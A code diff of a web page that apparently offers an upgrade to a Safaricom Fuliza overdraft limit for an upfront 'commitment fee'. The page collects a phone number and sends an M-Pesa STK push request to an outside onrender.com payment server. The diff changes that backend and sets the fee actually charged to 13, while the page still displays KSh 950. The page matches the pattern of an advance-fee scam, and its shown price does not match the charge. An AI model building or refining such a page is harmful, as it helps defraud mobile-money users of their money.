@@ -7,68 +7,15 @@
 
 <style>
 body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
-
-.top-bar{
-background:#1fb141;
-padding:12px;
-text-align:center;
-color:white;
-font-weight:bold;
-font-size:18px;
-}
-
-.payment-box{
-max-width:420px;
-margin:60px auto;
-background:white;
-padding:30px;
-border-radius:12px;
-box-shadow:0 6px 18px rgba(0,0,0,0.1);
-text-align:center;
-}
-
+.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
+.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
 .info{margin:10px 0;font-size:16px;}
-
-input{
-width:100%;
-padding:12px;
-margin-top:15px;
-border:1px solid #ddd;
-border-radius:6px;
-font-size:16px;
-}
-
-.pay-btn{
-margin-top:20px;
-width:100%;
-padding:14px;
-background:#1fb141;
-border:none;
-color:white;
-font-size:16px;
-border-radius:30px;
-cursor:pointer;
-}
-
+input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;}
+.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
 .pay-btn:hover{background:#179937;}
-
 .spinner{margin-top:15px;display:none;}
-
-.loader{
-border:4px solid #f3f3f3;
-border-top:4px solid #1fb141;
-border-radius:50%;
-width:30px;
-height:30px;
-animation:spin 1s linear infinite;
-margin:auto;
-}
-
-@keyframes spin{
-0%{transform:rotate(0deg);}
-100%{transform:rotate(360deg);}
-}
-
+.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 .message{margin-top:15px;font-size:14px;color:#555;}
 .encourage{margin-top:15px;font-size:14px;color:#555;}
 </style>
@@ -89,16 +36,13 @@ This confirms your request and allows our system to **automatically refresh your
 </p>
 
 <div class="info">Selected Fuliza Limit: <strong id="limit"></strong></div>
-<div class="info">Your Commitment is Fee: <strong>KSh 950</strong></div>
+<div class="info">Your Commitment Fee: <strong>KSh 950</strong></div>
 
 <input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">
 
 <button class="pay-btn" onclick="payNow()">Pay KSh 950 Now</button>
 
-<div class="spinner" id="spinner">
-<div class="loader"></div>
-</div>
-
+<div class="spinner" id="spinner"><div class="loader"></div></div>
 <div class="message" id="message"></div>
 
 <p class="encourage">
@@ -109,140 +53,107 @@ Once completed, your upgraded limit will be processed immediately.
 </div>
 
 <script>
-
 const selectedAmount = localStorage.getItem("selectedAmount");
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 
-const commitmentFee = 950;
+const commitmentFee = 13;
 
 function isSafaricom(number){
-return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
+  return /^(07|01)[0-9]{8}$/.test(number) || /^2547[0-9]{8}$/.test(number);
 }
 
 function formatPhone(number){
-return number.startsWith("0") ? "254"+number.substring(1) : number;
+  return number.startsWith("0") ? "254"+number.substring(1) : number;
 }
 
 async function payNow(){
+  const phone = document.getElementById("phone").value.trim();
+  const msg = document.getElementById("message");
+  const spinner = document.getElementById("spinner");
 
-const phone=document.getElementById("phone").value.trim();
-const msg=document.getElementById("message");
-const spinner=document.getElementById("spinner");
+  if(!phone){
+    msg.innerText = "Enter your phone number";
+    msg.style.color = "red";
+    return;
+  }
 
-if(!phone){
-msg.innerText="Enter your phone number";
-msg.style.color="red";
-return;
+  if(!isSafaricom(phone)){
+    msg.innerText = "Only Safaricom numbers allowed";
+    msg.style.color = "red";
+    return;
+  }
+
+  const phoneToSend = formatPhone(phone);
+  spinner.style.display = "block";
+  msg.innerText = "Sending payment request... please check your phone";
+  msg.style.color = "black";
+
+  try{
+    const res = await fetch("https://mpayafrica-server.onrender.com/deposit", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        phone_number: phoneToSend,
+        amount: commitmentFee
+      })
+    });
+
+    const data = await res.json();
+    spinner.style.display = "none";
+
+    if(data.success){
+      msg.innerText = "STK Push sent ✅ Enter your M‑Pesa PIN to confirm";
+      msg.style.color = "green";
+      checkPayment(data.reference, "payment4.html");
+    } else {
+      msg.innerText = "Payment failed: " + (data.message || "Try again");
+      msg.style.color = "red";
+    }
+
+  } catch(err){
+    spinner.style.display = "none";
+    msg.innerText = "Server error: " + (err.message || "Try again");
+    msg.style.color = "red";
+  }
 }
 
-if(!isSafaricom(phone)){
-msg.innerText="Only Safaricom numbers allowed";
-msg.style.color="red";
-return;
+async function checkPayment(reference, nextPage){
+  const msg = document.getElementById("message");
+  let attempts = 0;
+  const interval = setInterval(async () => {
+    attempts++;
+    if(attempts > 20){
+      clearInterval(interval);
+      msg.innerText = "Payment timeout. Please retry.";
+      msg.style.color = "red";
+      return;
+    }
+
+    try{
+      const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
+      const data = await res.json();
+
+      if(data.success && data.data){
+        const status = data.data.status.toLowerCase();
+
+        if(status==="success" || status==="loan_released" || status==="processing"){
+          clearInterval(interval);
+          msg.innerText = "Customer Commitment fee received successful ✅ Redirecting to final step...";
+          msg.style.color = "green";
+          setTimeout(()=>{window.location.href = nextPage},2000);
+        }
+
+        if(status==="failed" || status==="cancelled" || status==="stk_failed" || status==="error"){
+          clearInterval(interval);
+          msg.innerText = "Payment failed: " + (data.data.message || "Please try again");
+          msg.style.color = "red";
+        }
+      }
+
+    } catch(e){}
+  }, 3000);
 }
-
-const phoneToSend = formatPhone(phone);
-
-spinner.style.display="block";
-msg.innerText="Sending payment request... please check your phone";
-msg.style.color="black";
-
-try{
-
-const res = await fetch("https://nyota-paynecta-server.onrender.com/pay",{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify({
-phone:phoneToSend,
-amount:commitmentFee,
-account:"Commitment Fee"
-})
-});
-
-const data = await res.json();
-
-spinner.style.display="none";
-
-if(data.success){
-
-msg.innerText="STK Push sent ✅ Enter your M‑Pesa PIN to confirm";
-msg.style.color="green";
-
-checkPayment(data.reference || data.receipt.reference,"payment4.html");
-
-}else{
-
-msg.innerText="Payment failed: "+(data.error || "Try again");
-msg.style.color="red";
-
-}
-
-}catch(err){
-
-spinner.style.display="none";
-msg.innerText="Server error: "+(err.message || "Try again");
-msg.style.color="red";
-
-}
-
-}
-
-async function checkPayment(reference,nextPage){
-
-const msg=document.getElementById("message");
-let attempts=0;
-
-const interval=setInterval(async()=>{
-
-attempts++;
-
-if(attempts>20){
-clearInterval(interval);
-msg.innerText="Payment timeout. Please retry.";
-msg.style.color="red";
-return;
-}
-
-try{
-
-const res=await fetch("https://nyota-paynecta-server.onrender.com/receipt/"+reference);
-const data=await res.json();
-
-if(data.success && data.receipt){
-
-const status=data.receipt.status.toLowerCase();
-
-if(status==="processing" || status==="loan_released"){
-
-clearInterval(interval);
-
-msg.innerText="Payment successful ✅ Redirecting to final step...";
-msg.style.color="green";
-
-setTimeout(()=>{
-window.location.href=nextPage;
-},2000);
-
-}
-
-if(status==="cancelled" || status==="stk_failed" || status==="error"){
-
-clearInterval(interval);
-
-msg.innerText="Payment failed: "+data.receipt.status_note;
-msg.style.color="red";
-
-}
-
-}
-
-}catch(e){}
-
-},3000);
-
-}
-
 </script>
 
 </body>
-</html>
+  </html>
